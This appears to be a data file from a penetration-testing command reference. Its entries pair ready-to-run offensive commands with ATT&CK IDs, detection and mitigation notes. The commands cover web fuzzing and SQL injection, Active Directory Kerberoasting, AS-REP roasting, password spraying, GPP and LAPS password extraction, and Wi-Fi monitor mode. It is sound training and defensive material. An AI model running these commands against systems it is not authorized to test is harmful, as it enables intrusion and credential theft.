 {"id":"web-ffuf-param","level":"intermediate","requires":{"tool":"ffuf"},"updated":"2026-07","related":["web-arjun","web-sqlmap"],"cat":"Web App Testing","title":"Parameter fuzzing with ffuf","desc":"Discover hidden query parameters by fuzzing the FUZZ keyword with ffuf (-ac auto-calibrates filters).","team":"red","tags":["web","enumeration"],"attack":["T1595.003"],"detect":"Many requests to the same endpoint with varying parameter names (unusual parameter churn).","mitigate":"Validate and whitelist expected parameters; alert on unknown-parameter probing.","danger":"Authorized testing only; auto-calibration still sends large request volumes.","code":{"mac":"ffuf -w {{WORDLIST:params.txt}}:FUZZ -u 'https://{{TARGET:example.com}}/page?FUZZ=1' -mc 200 -ac","linux":"ffuf -w {{WORDLIST:params.txt}}:FUZZ -u 'https://{{TARGET:example.com}}/page?FUZZ=1' -mc 200 -ac"}},
 {"id":"web-feroxbuster","level":"intermediate","requires":{"tool":"feroxbuster"},"updated":"2026-07","cat":"Web App Testing","title":"Recursive content discovery","desc":"Recursively discover content with feroxbuster (non-default; Rust tool that recurses into found dirs).","team":"red","tags":["web","enumeration"],"attack":["T1595.003"],"detect":"Recursive path enumeration producing deep directory request trees and many 404s.","mitigate":"Rate-limit, block scanner signatures, and audit exposed directories.","danger":"Authorized testing only; recursion multiplies request volume quickly.","code":{"mac":"feroxbuster -u https://{{TARGET:example.com}} -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}}","linux":"feroxbuster -u https://{{TARGET:example.com}} -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}}"}},
 {"id":"web-gobuster-vhost","level":"intermediate","requires":{"tool":"gobuster"},"updated":"2026-07","cat":"Web App Testing","title":"Virtual host discovery","desc":"Find virtual hosts on a shared IP by fuzzing the Host header with gobuster vhost (--append-domain).","team":"red","tags":["web","discovery"],"attack":["T1595.003"],"detect":"Repeated requests to one IP with many differing Host header values.","mitigate":"Require valid SNI/Host, default-deny unknown vhosts, and monitor Host header anomalies.","danger":"Authorized testing only; may reveal internal or staging sites.","code":{"mac":"gobuster vhost -u https://{{TARGET:example.com}} -w {{WORDLIST:subdomains.txt}} --append-domain","linux":"gobuster vhost -u https://{{TARGET:example.com}} -w {{WORDLIST:subdomains.txt}} --append-domain"}},
 {"id":"web-arjun","level":"intermediate","updated":"2026-07","cat":"Web App Testing","title":"HTTP parameter discovery with arjun","desc":"Discover valid HTTP parameters for an endpoint with arjun (non-default; Python tool).","team":"red","tags":["web","enumeration"],"attack":["T1595.003"],"detect":"Bursts of requests differing only by parameter names against a single endpoint.","mitigate":"Strictly validate accepted parameters; alert on parameter brute-force patterns.","danger":"Authorized testing only; sends many probing requests to the endpoint.","code":{"linux":"arjun -u https://{{TARGET:example.com}}/api/endpoint"}},
 {"id":"web-katana","level":"intermediate","updated":"2026-07","cat":"Web App Testing","title":"Crawl endpoints with katana","desc":"Map endpoints and JavaScript-referenced URLs with katana (ProjectDiscovery; -jc crawls JS, -d depth).","team":"red","tags":["web","recon"],"attack":["T1594"],"detect":"Systematic breadth/depth crawl from one client, including parsing of JS assets.","mitigate":"Rate-limit crawlers, require auth for sensitive areas, and monitor aggressive crawling.","danger":"Authorized testing only; deep crawls generate substantial traffic.","code":{"mac":"katana -u https://{{TARGET:example.com}} -jc -d 3","linux":"katana -u https://{{TARGET:example.com}} -jc -d 3"}},
 {"id":"web-httpx","level":"intermediate","updated":"2026-07","related":["web-whatweb","web-gobuster-dir"],"cat":"Web App Testing","title":"Probe live web services with httpx","desc":"Probe for live services, titles, status codes, and tech with httpx (ProjectDiscovery, not the Python lib).","team":"red","tags":["web","discovery"],"attack":["T1595"],"detect":"Fan-out of lightweight requests across many hosts/ports from a single source.","mitigate":"Rate-limit and geofence; alert on mass probing of the estate.","danger":"Authorized testing only; this is ProjectDiscovery httpx, distinct from the Python httpx library.","code":{"mac":"httpx -u https://{{TARGET:example.com}} -title -status-code -tech-detect","linux":"httpx -u https://{{TARGET:example.com}} -title -status-code -tech-detect"}},
 {"id":"web-sqlmap","level":"intermediate","requires":{"tool":"sqlmap"},"updated":"2026-07","cat":"Web App Testing","title":"SQL injection testing with sqlmap","desc":"Automated SQLi detection and exploitation with sqlmap (non-default; --batch runs non-interactively).","team":"red","tags":["web","exploitation"],"attack":["T1190"],"detect":"UNION/sleep/boolean SQLi payloads and the sqlmap User-Agent flood the app and DB logs.","mitigate":"Use parameterized queries, least-privilege DB accounts, and WAF SQLi rules.","danger":"Authorized testing only; can read, modify, or dump data — never target production without written scope.","code":{"mac":"sqlmap -u 'https://{{TARGET:example.com}}/page?id=1' --batch --level 2 --risk 1","linux":"sqlmap -u 'https://{{TARGET:example.com}}/page?id=1' --batch --level 2 --risk 1"}},
 {"id":"web-wpscan","level":"intermediate","requires":{"tool":"wpscan"},"updated":"2026-07","cat":"Web App Testing","title":"WordPress enumeration with wpscan","desc":"Enumerate WordPress users, themes, and vulnerable plugins with wpscan (non-default; --enumerate).","team":"red","tags":["web","enumeration"],"attack":["T1595.002"],"detect":"Requests to /wp-json, /?author=, and readme.html plus the wpscan User-Agent.","mitigate":"Hide the version, block user enumeration, patch plugins, and rate-limit /wp-login.","danger":"Authorized testing only; the vuln data feed needs a free API token but enumeration works without it.","code":{"mac":"wpscan --url https://{{TARGET:example.com}} --enumerate u,vp","linux":"wpscan --url https://{{TARGET:example.com}} --enumerate u,vp"}},
 {"id":"web-dalfox","level":"intermediate","requires":{"tool":"dalfox"},"updated":"2026-07","cat":"Web App Testing","title":"XSS testing with dalfox","desc":"Test parameters for reflected/DOM XSS with dalfox (non-default; Go-based scanner).","team":"red","tags":["web","exploitation"],"attack":["T1190"],"detect":"XSS probe strings (script tags, event handlers) reflected in requests across parameters.","mitigate":"Context-aware output encoding, a strong CSP, input validation, and WAF XSS signatures.","danger":"Authorized testing only; injects active XSS test payloads into the target.","code":{"mac":"dalfox url 'https://{{TARGET:example.com}}/search?q=test'","linux":"dalfox url 'https://{{TARGET:example.com}}/search?q=test'"}},
 {"id":"web-sslscan","level":"intermediate","requires":{"tool":"sslscan"},"updated":"2026-07","cat":"Web App Testing","title":"TLS/cipher enumeration with sslscan","desc":"Enumerate supported TLS versions, ciphers, and certificate details with sslscan (non-default).","team":"red","tags":["web","tls"],"attack":["T1595"],"detect":"Multiple TLS handshakes cycling cipher suites from one source in a short window.","mitigate":"Disable legacy TLS/ciphers, enforce TLS 1.2+, and monitor for handshake scanning.","danger":"Authorized testing only; passive TLS enumeration but still logged at the TLS terminator.","code":{"mac":"sslscan {{TARGET:example.com}}:443","linux":"sslscan {{TARGET:example.com}}:443"}},

/* ================= ACTIVE DIRECTORY ATTACKS ================= */
 {"id":"adx-sharphound-collect","level":"advanced","updated":"2026-07","related":["adx-bloodhound-python","adx-spn-discover"],"cat":"Active Directory Attacks","title":"SharpHound collection for BloodHound","desc":"Collect AD objects, sessions, and ACLs into a zip for BloodHound analysis. Requires SharpHound.exe or the SharpHound.ps1 collector on a domain-joined host.","danger":"Authorized engagements only. Generates heavy LDAP/SMB traffic and is widely signatured.","team":"red","tags":["active-directory","enumeration","recon"],"attack":["T1087.002","T1069.002"],"detect":"Directory Service 4662 spikes and Event ID 1644 (LDAP query logging) show one host reading large swaths of AD; EDR/AV flags SharpHound; unusual SMB session enumeration across many hosts.","mitigate":"Deploy AD tiering and least privilege; monitor for bulk LDAP reads; restrict SAMR/session enumeration (RestrictRemoteSam); alert on collector signatures.","code":{"ps":"# Standalone binary (domain-joined context):\n.\\SharpHound.exe -c All -d {{DOMAIN:corp.local}} --zipfilename loot\n\n# PowerShell collector variant:\nImport-Module .\\SharpHound.ps1\nInvoke-BloodHound -CollectionMethod All -Domain {{DOMAIN:corp.local}} -OutputDirectory C:\\Temp"}},
 {"id":"adx-bloodhound-python","level":"advanced","updated":"2026-07","cat":"Active Directory Attacks","title":"Remote BloodHound collection (Python)","desc":"Collect AD data remotely over LDAP with valid creds, no code on the target. Requires bloodhound-python (pip).","danger":"Authorized use only. Bulk LDAP reads are noisy and logged on the DC.","team":"red","tags":["active-directory","enumeration","ldap"],"attack":["T1087.002","T1069.002"],"detect":"DC LDAP query logging (Event 1644) and 4662 show a single account enumerating users, groups, ACLs, and trusts in one burst from a non-admin workstation.","mitigate":"Least-privilege service accounts; monitor for anomalous LDAP volume; segment management access to DCs.","code":{"linux":"bloodhound-python -u {{USER:jdoe}} -p '{{PASS}}' -d {{DOMAIN:corp.local}} -ns {{DC_IP:10.0.0.10}} -c All --zip","mac":"bloodhound-python -u {{USER:jdoe}} -p '{{PASS}}' -d {{DOMAIN:corp.local}} -ns {{DC_IP:10.0.0.10}} -c All --zip"}},
 {"id":"adx-powerview-domain-enum","level":"advanced","updated":"2026-07","cat":"Active Directory Attacks","title":"PowerView domain/user/computer enumeration","desc":"Enumerate the domain, users, computers, and privileged groups over LDAP. Requires PowerView.ps1 (PowerSploit/Empire).","danger":"Authorized use only. LDAP enumeration is logged on the DC.","team":"red","tags":["active-directory","enumeration","ldap"],"attack":["T1087.002","T1069.002"],"detect":"4662 and LDAP diagnostics (1644) show broad object queries; unusual PowerShell module loads flagged by AMSI/Sysmon Event 7 (Assembly/module load).","mitigate":"Constrained Language Mode; AMSI + script block logging (4104); restrict who can read sensitive attributes; alert on PowerView cmdlet patterns.","code":{"ps":"Import-Module .\\PowerView.ps1\nGet-Domain\nGet-DomainUser -Properties samaccountname,description,pwdlastset | Sort-Object pwdlastset\nGet-DomainComputer -Properties dnshostname,operatingsystem\nGet-DomainGroupMember 'Domain Admins'"}},
 {"id":"adx-powerview-shares","level":"advanced","updated":"2026-07","cat":"Active Directory Attacks","title":"Domain share hunting (Find-DomainShare)","desc":"Locate readable network shares across domain computers to find loot. Requires PowerView.ps1.","danger":"Authorized use only. Touches many hosts and can trip share-access auditing.","team":"red","tags":["active-directory","smb","discovery"],"attack":["T1135"],"detect":"Many SMB tree-connect (5140) / share access events from one source across numerous hosts in a short window; NIDS SMB enumeration signatures.","mitigate":"Enable object-access auditing on shares; remove open/legacy shares; segment SMB; alert on horizontal share sweeps.","code":{"ps":"Import-Module .\\PowerView.ps1\nFind-DomainShare -CheckShareAccess\n# Search interesting file names on found shares:\nFind-InterestingDomainShareFile -Include *pass*,*.kdbx,*.config"}},
 {"id":"adx-acl-enum","level":"advanced","updated":"2026-07","cat":"Active Directory Attacks","title":"Interesting ACL / rights enumeration","desc":"Find abusable ACEs (GenericAll, WriteDACL, ForceChangePassword, etc.) across AD objects. Requires PowerView.ps1.","danger":"Authorized use only. Reveals privilege-escalation paths; enumeration is logged.","team":"red","tags":["active-directory","enumeration","ldap"],"attack":["T1087.002","T1069.002"],"detect":"4662 with security-descriptor read access on many objects; BloodHound-style attribute enumeration flagged by LDAP volume monitoring.","mitigate":"Audit and tighten delegated ACLs; remove excessive GenericAll/WriteDACL grants; use tiered admin model; monitor object DACL reads.","code":{"ps":"Import-Module .\\PowerView.ps1\nFind-InterestingDomainAcl -ResolveGUIDs |\n  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner|ForceChangePassword' } |\n  Select-Object IdentityReferenceName, ActiveDirectoryRights, ObjectDN"}},
 {"id":"adx-delegation-enum","level":"advanced","updated":"2026-07","cat":"Active Directory Attacks","title":"Kerberos delegation enumeration","desc":"Find unconstrained, constrained, and resource-based delegation configs. Requires PowerView.ps1 (or impacket findDelegation.py).","danger":"Authorized use only. Delegation misconfigs are high-impact escalation paths.","team":"red","tags":["active-directory","enumeration"],"attack":["T1087.002"],"detect":"LDAP reads of userAccountControl / msDS-AllowedToDelegateTo attributes (4662, 1644); anomalous querying of computer trust attributes.","mitigate":"Set sensitive accounts to 'Account is sensitive and cannot be delegated'; avoid unconstrained delegation; audit msDS-AllowedToActOnBehalfOfOtherIdentity.","code":{"ps":"Import-Module .\\PowerView.ps1\n# Unconstrained delegation (TRUSTED_FOR_DELEGATION):\nGet-DomainComputer -Unconstrained | Select-Object dnshostname\n# Constrained delegation targets:\nGet-DomainUser -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto\nGet-DomainComputer -TrustedToAuth | Select-Object dnshostname,msds-allowedtodelegateto","linux":"findDelegation.py {{DOMAIN:corp.local}}/{{USER:jdoe}}:'{{PASS}}' -dc-ip {{DC_IP:10.0.0.10}}"}},
 {"id":"adx-trust-enum","level":"advanced","updated":"2026-07","cat":"Active Directory Attacks","title":"Domain and forest trust enumeration","desc":"Map trust relationships to plan lateral movement across domains/forests. Native tools plus PowerView.","danger":"Authorized use only. Trust mapping precedes cross-domain attacks.","team":"red","tags":["active-directory","enumeration","discovery"],"attack":["T1482"],"detect":"Enumeration of trustedDomain objects (4662); nltest usage on endpoints; LDAP queries against the System container.","mitigate":"Minimize and audit trusts; enable SID filtering / selective authentication on external trusts; monitor cross-domain auth patterns.","code":{"cmd":"nltest /domain_trusts /all_trusts","ps":"# Native RSAT AD module:\nGet-ADTrust -Filter * | Select-Object Name,Direction,TrustType\n# PowerView:\nGet-DomainTrust\nGet-ForestTrust"}},
 {"id":"adx-spn-discover","level":"advanced","updated":"2026-07","related":["adx-kerberoast-impacket","adx-kerberoast-rubeus"],"cat":"Active Directory Attacks","title":"Service Principal Name (SPN) discovery","desc":"Find accounts with SPNs (Kerberoasting candidates) using native setspn or LDAP, no external tools.","danger":"Authorized use only. Identifies roastable service accounts.","team":"red","tags":["active-directory","enumeration","ldap"],"attack":["T1558.003"],"detect":"LDAP queries filtering servicePrincipalName=* (1644, 4662); setspn.exe execution on non-admin hosts.","mitigate":"Use gMSAs / long random passwords for service accounts; minimize accounts with SPNs; monitor SPN attribute queries.","code":{"cmd":"setspn -T {{DOMAIN:corp.local}} -Q */*","ps":"# ADSI, no tools required:\n$s = [adsisearcher]'(&(objectCategory=user)(servicePrincipalName=*))'\n$s.PageSize = 500\n$s.FindAll() | ForEach-Object { $_.Properties.samaccountname }"}},
 {"id":"adx-kerberoast-impacket","level":"advanced","updated":"2026-07","related":["adx-spn-discover","adx-asrep-impacket"],"cat":"Active Directory Attacks","title":"Kerberoasting with GetUserSPNs (impacket)","desc":"Request TGS tickets for SPN accounts and output crackable hashes. Requires impacket (GetUserSPNs.py).","danger":"Authorized use only. Crack offline; do not brute-force live accounts.","team":"red","tags":["active-directory","password","enumeration"],"attack":["T1558.003"],"detect":"Kerberos 4769 for service tickets with encryption type 0x17 (RC4) to multiple SPNs from one account in quick succession.","mitigate":"Enforce AES-only Kerberos; gMSAs and 25+ char service passwords; alert on RC4 4769 bursts; honeypot SPN accounts.","code":{"linux":"GetUserSPNs.py {{DOMAIN:corp.local}}/{{USER:jdoe}}:'{{PASS}}' -dc-ip {{DC_IP:10.0.0.10}} -request -outputfile kerb_hashes.txt\n# then crack offline:\nhashcat -m 13100 kerb_hashes.txt wordlist.txt","mac":"GetUserSPNs.py {{DOMAIN:corp.local}}/{{USER:jdoe}}:'{{PASS}}' -dc-ip {{DC_IP:10.0.0.10}} -request -outputfile kerb_hashes.txt"}},
 {"id":"adx-kerberoast-rubeus","level":"advanced","updated":"2026-07","cat":"Active Directory Attacks","title":"Kerberoasting with Rubeus","desc":"Request and export Kerberoast hashes from a Windows domain host. Requires Rubeus.exe.","danger":"Authorized use only. Crack tickets offline against systems you may test.","team":"red","tags":["active-directory","password"],"attack":["T1558.003"],"detect":"4769 RC4 (0x17) ticket requests for many SPNs from one workstation; Rubeus flagged by EDR/AMSI; Sysmon process/assembly-load events.","mitigate":"AES-only service accounts; gMSAs; alert on RC4 downgrade and 4769 volume; application allowlisting to block Rubeus.","code":{"ps":".\\Rubeus.exe kerberoast /format:hashcat /outfile:kerb_hashes.txt\n# Target a single account and avoid RC4-only noise if AES is set:\n.\\Rubeus.exe kerberoast /user:{{SVC_ACCT:svc-sql}} /simple"}},
 {"id":"adx-asrep-impacket","level":"advanced","updated":"2026-07","cat":"Active Directory Attacks","title":"AS-REP roasting with GetNPUsers (impacket)","desc":"Roast accounts that do not require Kerberos pre-authentication. Requires impacket (GetNPUsers.py).","danger":"Authorized use only. Crack the returned hashes offline.","team":"red","tags":["active-directory","password","enumeration"],"attack":["T1558.004"],"detect":"4768 AS-REQ with pre-auth not required for multiple accounts from one source; LDAP filtering on userAccountControl bit 0x400000 (DONT_REQ_PREAUTH).","mitigate":"Require Kerberos pre-authentication on all accounts; audit DONT_REQ_PREAUTH flag; enforce strong passwords; alert on AS-REP roasting patterns.","code":{"linux":"# With a userlist (no creds needed):\nGetNPUsers.py {{DOMAIN:corp.local}}/ -usersfile users.txt -dc-ip {{DC_IP:10.0.0.10}} -no-pass -format hashcat -outputfile asrep.txt\n# then: hashcat -m 18200 asrep.txt wordlist.txt","mac":"GetNPUsers.py {{DOMAIN:corp.local}}/ -usersfile users.txt -dc-ip {{DC_IP:10.0.0.10}} -no-pass -format hashcat -outputfile asrep.txt"}},
 {"id":"adx-asrep-rubeus","level":"advanced","updated":"2026-07","cat":"Active Directory Attacks","title":"AS-REP roasting with Rubeus","desc":"Enumerate and roast pre-auth-disabled accounts from a Windows host. Requires Rubeus.exe.","danger":"Authorized use only. Crack offline against authorized targets.","team":"red","tags":["active-directory","password"],"attack":["T1558.004"],"detect":"4768 events showing pre-auth not required across accounts; Rubeus binary flagged by EDR; script/assembly load telemetry.","mitigate":"Enforce Kerberos pre-authentication; remove DONT_REQ_PREAUTH; strong password policy; application allowlisting.","code":{"ps":".\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt\n# Scope to a specific user:\n.\\Rubeus.exe asreproast /user:{{USER:legacyacct}} /format:hashcat"}},
 {"id":"adx-spray-kerbrute","level":"advanced","requires":{"tool":"kerbrute"},"updated":"2026-07","cat":"Active Directory Attacks","title":"Password spraying with kerbrute","desc":"Test one password against many users via Kerberos pre-auth (low lockout risk if paced). Requires kerbrute.","danger":"Authorized use only. Respect lockout policy; one password per round with delays.","team":"red","tags":["active-directory","password","account"],"attack":["T1110.003"],"detect":"Many 4768/4771 pre-auth attempts (single password) across distinct accounts from one source IP; short-window failure clustering.","mitigate":"Account lockout + smart lockout; MFA; monitor 4771/4768 spray patterns; alert on many accounts, one source.","code":{"linux":"kerbrute passwordspray -d {{DOMAIN:corp.local}} --dc {{DC_IP:10.0.0.10}} users.txt '{{PASSWORD:Spring2026!}}'","mac":"kerbrute passwordspray -d {{DOMAIN:corp.local}} --dc {{DC_IP:10.0.0.10}} users.txt '{{PASSWORD:Spring2026!}}'","ps":".\\kerbrute_windows_amd64.exe passwordspray -d {{DOMAIN:corp.local}} --dc {{DC_IP:10.0.0.10}} users.txt {{PASSWORD:Spring2026!}}"}},
 {"id":"adx-spray-netexec","level":"advanced","requires":{"tool":"NetExec"},"updated":"2026-07","cat":"Active Directory Attacks","title":"Password spraying with NetExec","desc":"Spray credentials over SMB/LDAP and stop on success. Requires NetExec (nxc, formerly CrackMapExec).","danger":"Authorized use only. Failed SMB logons risk lockouts; pace carefully.","team":"red","tags":["active-directory","password","smb"],"attack":["T1110.003"],"detect":"Bursts of 4625 (failed logon) or 4771 across many usernames from one host; SMB auth flood to the DC.","mitigate":"Lockout thresholds; MFA; disable NTLM where possible; alert on horizontal auth failures; network segmentation.","code":{"linux":"nxc smb {{DC_IP:10.0.0.10}} -u users.txt -p '{{PASSWORD:Spring2026!}}' --continue-on-success\n# LDAP variant:\nnxc ldap {{DC_IP:10.0.0.10}} -u users.txt -p '{{PASSWORD:Spring2026!}}' --continue-on-success"}},
 {"id":"adx-kerbrute-userenum","level":"advanced","requires":{"tool":"kerbrute"},"updated":"2026-07","cat":"Active Directory Attacks","title":"Username enumeration via Kerberos","desc":"Validate which usernames exist using Kerberos pre-auth responses (no lockout). Requires kerbrute.","danger":"Authorized use only. Confirms valid accounts for later spraying.","team":"red","tags":["active-directory","enumeration","account"],"attack":["T1087.002"],"detect":"Many 4768 AS-REQ with distinct usernames from one source; DC receiving rapid Kerberos principal probes.","mitigate":"Monitor 4768 enumeration bursts; rate-limit at network edge; avoid predictable username schemes; alert on high invalid-principal rates.","code":{"linux":"kerbrute userenum -d {{DOMAIN:corp.local}} --dc {{DC_IP:10.0.0.10}} users.txt","mac":"kerbrute userenum -d {{DOMAIN:corp.local}} --dc {{DC_IP:10.0.0.10}} users.txt","ps":".\\kerbrute_windows_amd64.exe userenum -d {{DOMAIN:corp.local}} --dc {{DC_IP:10.0.0.10}} users.txt"}},
 {"id":"adx-ldapsearch-enum","level":"advanced","updated":"2026-07","cat":"Active Directory Attacks","title":"LDAP enumeration with ldapsearch","desc":"Query users, groups, and attributes directly over LDAP. Built in on macOS; needs ldap-utils/openldap on Linux.","danger":"Authorized use only. Bind credentials and queries are logged on the DC.","team":"red","tags":["active-directory","ldap","enumeration"],"attack":["T1087.002","T1069.002"],"detect":"DC LDAP query logging (1644) and 4662 show an account pulling large result sets; unusual LDAP binds from non-management hosts.","mitigate":"Least privilege on read attributes; LDAP query auditing; restrict anonymous/legacy binds; segment DC access.","code":{"linux":"ldapsearch -x -H ldap://{{DC_IP:10.0.0.10}} -D '{{USER:jdoe}}@{{DOMAIN:corp.local}}' -w '{{PASS}}' -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName description","mac":"ldapsearch -x -H ldap://{{DC_IP:10.0.0.10}} -D '{{USER:jdoe}}@{{DOMAIN:corp.local}}' -w '{{PASS}}' -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName description"}},
 {"id":"adx-ldap-native-query","level":"advanced","updated":"2026-07","cat":"Active Directory Attacks","title":"Native LDAP queries (no tools)","desc":"Enumerate AD from a Windows host using built-in ADSI searcher and dsquery — no PowerView needed.","danger":"Authorized use only. LDAP reads are logged on the DC.","team":"red","tags":["active-directory","ldap","enumeration"],"attack":["T1087.002","T1069.002"],"detect":"4662 / 1644 on the DC; dsquery.exe execution; PowerShell script block logging (4104) capturing adsisearcher usage.","mitigate":"Least-privilege attribute access; script block + module logging; alert on bulk LDAP reads from workstations.","code":{"cmd":"dsquery user -limit 0\ndsquery group -name \"*admin*\"","ps":"# Find users whose password never expires (UAC bit 0x10000):\n$s=[adsisearcher]'(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))'\n$s.PageSize=500\n$s.FindAll() | ForEach-Object { $_.Properties.samaccountname }"}},
 {"id":"adx-gpp-cpassword","level":"advanced","updated":"2026-07","cat":"Active Directory Attacks","title":"Group Policy Preferences (GPP) cpassword","desc":"Find AES-encrypted (publicly keyed) passwords left in SYSVOL Group Policy XML.","danger":"Authorized use only. Any domain user can read SYSVOL; recovered creds may be live.","team":"red","tags":["active-directory","password","smb"],"attack":["T1552.006"],"detect":"SYSVOL read access for Groups.xml/Services.xml/Scheduledtasks.xml; Get-GPPPassword tooling flagged by EDR; unusual SYSVOL crawling.","mitigate":"Install MS14-025 and remove legacy cpassword XML from SYSVOL; rotate any exposed accounts; audit SYSVOL for cpassword strings.","code":{"cmd":"findstr /S /I cpassword \\\\{{DOMAIN:corp.local}}\\sysvol\\*.xml","ps":"# PowerSploit helper (decrypts cpassword):\nGet-GPPPassword","linux":"# impacket remote reader (authenticated SYSVOL search):\nGet-GPPPassword.py {{DOMAIN:corp.local}}/'{{USER:jdoe}}':'{{PASS}}'@{{DC_IP:10.0.0.10}}"}},
 {"id":"adx-laps-read","level":"advanced","updated":"2026-07","cat":"Active Directory Attacks","title":"Read LAPS local admin passwords","desc":"Retrieve ms-Mcs-AdmPwd (or msLAPS-Password) for computers where your principal has read rights.","danger":"Authorized use only. Exposes local admin passwords; requires delegated read permission.","team":"red","tags":["active-directory","password"],"attack":["T1555"],"detect":"4662 read access to ms-Mcs-AdmPwd / msLAPS-Password attributes; anomalous accounts reading LAPS attributes across many computers.","mitigate":"Tightly scope LAPS read ACLs; audit ms-Mcs-AdmPwd reads (SACL); rotate on read; use Windows LAPS with encryption.","code":{"ps":"# RSAT AD module or PowerView:\nGet-ADComputer {{HOST:WS01}} -Properties 'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime' |\n  Select-Object Name,'ms-Mcs-AdmPwd'\n# Find all readable LAPS passwords:\nGet-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' |\n  Where-Object { $_.'ms-Mcs-AdmPwd' } | Select-Object Name,'ms-Mcs-AdmPwd'"}},
 {"id":"adx-priv-groups-enum","level":"advanced","updated":"2026-07","cat":"Active Directory Attacks","title":"Privileged group membership enumeration","desc":"List members of Domain Admins, Enterprise Admins, and other high-value groups using native tools.","danger":"Authorized use only. Maps high-value targets; enumeration is logged.","team":"red","tags":["active-directory","enumeration","account"],"attack":["T1069.002","T1087.002"],"detect":"net.exe /domain group queries; 4662 reads of privileged group membership; repeated group enumeration from workstations.","mitigate":"Minimize privileged group membership; use PAM/JIT admin; monitor group enumeration; protected users group for admins.","code":{"cmd":"net group \"Domain Admins\" /domain\nnet group \"Enterprise Admins\" /domain","ps":"Get-ADGroupMember 'Domain Admins' -Recursive | Select-Object name,objectClass\n# PowerView equivalent:\nGet-DomainGroupMember -Identity 'Domain Admins' -Recurse"}},
 {"id":"adx-machineaccountquota","level":"advanced","requires":{"tool":"NetExec"},"updated":"2026-07","cat":"Active Directory Attacks","title":"Machine Account Quota (MAQ) enumeration","desc":"Check ms-DS-MachineAccountQuota — a nonzero value lets low-priv users join computers (RBCD/noPac paths).","danger":"Authorized use only. Identifies a common privilege-escalation prerequisite.","team":"red","tags":["active-directory","enumeration","ldap"],"attack":["T1087.002"],"detect":"LDAP reads of ms-DS-MachineAccountQuota (1644, 4662); later 4741 (computer account created) by a standard user is a stronger signal.","mitigate":"Set ms-DS-MachineAccountQuota to 0 and delegate computer creation explicitly; monitor 4741 by non-admins.","code":{"ps":"# Native AD module:\nGet-ADObject -Identity ((Get-ADDomain).DistinguishedName) -Properties ms-DS-MachineAccountQuota |\n  Select-Object ms-DS-MachineAccountQuota\n# PowerView:\nGet-DomainObject -Identity (Get-Domain).Name | Select-Object ms-ds-machineaccountquota","linux":"nxc ldap {{DC_IP:10.0.0.10}} -u {{USER:jdoe}} -p '{{PASS}}' -M maq"}},
 {"id":"adx-adcs-enum","level":"advanced","updated":"2026-07","cat":"Active Directory Attacks","title":"AD CS certificate template enumeration","desc":"Enumerate certificate templates/CAs for misconfigurations (ESC1-ESC8). Requires Certipy (Linux) or Certify.exe (Windows).","danger":"Authorized use only. Identifies certificate-based escalation paths; enumeration only.","team":"red","tags":["active-directory","certificates","enumeration"],"attack":["T1649"],"detect":"LDAP reads of the PKI/Certificate Templates container (4662); Certipy/Certify tooling flagged by EDR; anomalous enrollment-config queries.","mitigate":"Remove ENROLLEE_SUPPLIES_SUBJECT + client-auth on low-priv templates; restrict enrollment rights; enable CA auditing; apply Microsoft ADCS hardening.","code":{"linux":"certipy find -u {{USER:jdoe}}@{{DOMAIN:corp.local}} -p '{{PASS}}' -dc-ip {{DC_IP:10.0.0.10}} -vulnerable -stdout","ps":".\\Certify.exe find /vulnerable"}},
 {"id":"adx-null-session-rid","level":"advanced","requires":{"tool":"enum4linux-ng"},"updated":"2026-07","cat":"Active Directory Attacks","title":"Null-session / RID-cycling enumeration","desc":"Enumerate users and groups via anonymous SMB/RPC where legacy access is allowed. Requires enum4linux-ng or rpcclient.","danger":"Authorized use only. Works only against misconfigured hosts allowing null sessions.","team":"red","tags":["active-directory","enumeration","smb"],"attack":["T1087.002"],"detect":"Anonymous/null SMB sessions (5140/5145) and SAMR queries; RID-cycling shows sequential account lookups from one source.","mitigate":"Set RestrictAnonymous/RestrictRemoteSam; disable null sessions; block SMB from untrusted segments; alert on anonymous SAMR enumeration.","code":{"linux":"enum4linux-ng -A {{DC_IP:10.0.0.10}}\n# Manual RID cycling via rpcclient:\nrpcclient -U '' -N {{DC_IP:10.0.0.10}} -c 'enumdomusers'"}},

/* ================= WIRELESS AUDITING ================= */
 {"id":"wifi-list-interfaces","level":"intermediate","related":["wifi-scan-nearby","wifi-monitor-airmon"],"cat":"Wireless Auditing","title":"List wireless interfaces & capabilities","desc":"Enumerate local Wi-Fi adapters and their driver/PHY info before auditing.","tags":["wireless","recon","cross-platform"],"code":{"linux":"iw dev\niw phy","mac":"networksetup -listallhardwareports\nsystem_profiler SPAirPortDataType","ps":"netsh wlan show interfaces\nnetsh wlan show drivers"}},
 {"id":"wifi-scan-nearby","level":"intermediate","updated":"2026-07","cat":"Wireless Auditing","title":"Survey nearby access points","desc":"List in-range APs (SSID/BSSID/channel/signal/security) using each OS's native tooling.","danger":"Passive recon of third-party networks may be restricted; audit only networks you own or are authorized to test.","team":"red","tags":["wireless","recon","scanning"],"attack":["T1595"],"detect":"Purely passive listening leaves no over-the-air trace, but repeated association probes from one MAC show up in AP client logs and WIDS association tables.","mitigate":"Disable SSID auto-response where possible, enable WIDS/WIPS, and treat SSID hiding as obscurity not security.","code":{"linux":"nmcli -f SSID,BSSID,CHAN,SIGNAL,SECURITY dev wifi list","mac":"system_profiler SPAirPortDataType","ps":"netsh wlan show networks mode=bssid"}},
 {"id":"wifi-monitor-airmon","level":"intermediate","requires":{"elevation":true,"tool":"airmon-ng"},"updated":"2026-07","related":["wifi-airodump-survey","wifi-set-channel"],"cat":"Wireless Auditing","title":"Enable monitor mode (airmon-ng)","desc":"Put an adapter into monitor mode with aircrack-ng's airmon-ng, killing interfering processes first.","danger":"Requires root and disconnects the interface from normal networking; use only on hardware/networks you are authorized to audit.","team":"red","tags":["wireless","recon","linux"],"attack":["T1040"],"detect":"Monitor mode is receive-only and not observable on the air; on the host, an EDR/osquery check for interfaces in monitor type (e.g. wlan0mon) flags it.","mitigate":"Restrict who can run raw-socket/monitor tools, and rely on WPA3/PMF so captured frames are not useful.","code":{"linux":"sudo airmon-ng check kill\nsudo airmon-ng start {{IFACE:wlan0}}"}},
